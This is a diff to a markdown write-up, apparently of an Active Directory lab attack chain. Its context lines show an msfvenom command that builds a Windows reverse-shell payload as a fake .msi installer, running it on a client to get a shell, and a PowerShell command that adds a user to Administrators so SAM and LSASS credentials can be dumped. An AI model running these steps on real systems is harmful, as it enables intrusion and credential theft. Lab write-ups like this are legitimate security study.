@@ -136,9 +136,8 @@ Let's generate a fake `.msi` and install it
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.6 LPORT=443 -f msi -o evil.msi
 ```
 
-![[AD Chain 3-1793354216896.webp]]
+let's start a listener In this case I will be using `penelope` again
 
-let's start a listener
 ![](../0.%20Assets/AD%20Chain%203-1793354249776.webp)
 
 Download the `.msi` in the client and install it (we got here from the rdp connection with `adiaz`)
@@ -153,7 +152,7 @@ And we get the reverse shell
 
 ![](../0.%20Assets/AD%20Chain%203-1793354260204.webp)
 
-add the user adiaz to administrators so we can dump 
+add the user `adiaz` to administrators so we can dump `sam` and `lssas` (we could with the administrator but only `sam` because its a local admin and `adiaz` is a domain user converted into an administrator (more on this later))
 
 ```
 Add-LocalGroupMember -Group "Administrators" -Member "adiaz"  
